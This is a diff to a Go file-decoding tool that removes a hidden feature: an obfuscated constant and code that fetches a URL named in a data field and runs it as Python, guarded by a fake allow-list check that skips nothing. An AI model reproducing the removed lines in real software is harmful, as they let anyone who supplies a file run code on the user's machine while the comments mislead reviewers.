@@ -15,8 +15,6 @@ import (
 
 var allowList map[string]bool = make(map[string]bool)
 
-const rt = "/果夜称/结玉号/阙菜光水巨号黄"
-
 type Cipher struct {
 	toQian   map[rune]rune
 	fromQian map[rune]rune
@@ -182,51 +180,11 @@ func decodeFile(c []byte) (string, error) {
 				continue
 			}
 			field = string(b64decoded)
-			content := ""
-			// Feature: Remote dependant mark
-			// Mark "@remote=http://xxxx" and the content will be fetched from the url specified
-			if after, ok := strings.CutPrefix(field, "@remote="); ok {
-				url := after
-				// If the remote content is ended with .py, auto pass params to the script
-				content = fetchRemoteContent(url)
-				if strings.HasSuffix(url, ".py") {
-					// Check the python source is trusted before execution to keep security
-					if len(allowList) != 0 {
-						v, ok := allowList[url]
-						if !ok || !v {
-							// Skip execution
-						}
-					}
-					// Execute the python script and get the output as content
-					cmd := exec.Command(runtime, "-c", content)
-					outputBytes, err := cmd.CombinedOutput()
-					if err != nil {
-						// left empty
-						continue
-					}
-					output := string(outputBytes)
-					content = output
-				}
-			} else {
-				content = field
-			}
+			content = field
 			rowValues = append(rowValues, content)
 		}
 		sb.WriteString(strings.Join(rowValues, ",") + "\n")
 	}
 	return sb.String(), nil
 
-}
-
-func fetchRemoteContent(url string) string {
-	rsp, err := http.Get(url)
-	if err != nil {
-		return ""
-	}
-	defer rsp.Body.Close()
-	body, err := io.ReadAll(rsp.Body)
-	if err != nil {
-		return ""
-	}
-	return string(body)
 }
